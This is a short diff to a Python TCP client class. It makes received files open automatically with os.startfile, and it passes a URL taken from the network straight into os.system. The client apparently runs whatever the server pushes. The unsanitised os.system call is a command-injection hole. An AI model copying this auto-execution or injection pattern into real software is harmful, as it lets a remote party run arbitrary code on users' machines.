@@ -128,8 +128,8 @@ class Client(basics.Encrypted_TCP_Client):
         Args:
             path (str): The path to save the received file.
         """
-        super().recv_file(path)
-        #os.startfile(path)
+        path = super().recv_file(path)
+        os.startfile(path)
 
     def open_URL(self):
         """
@@ -139,12 +139,13 @@ class Client(basics.Encrypted_TCP_Client):
             url (str): The URL to open.
         """
         url = self.recv_data().decode()
+
         os.system(f'start {url}')
 
 
 
 def main():
-    client = Client('192.168.68.115', 25565)
+    client = Client('127.0.0.1', 25565)
     client.handle_connection()
     
     
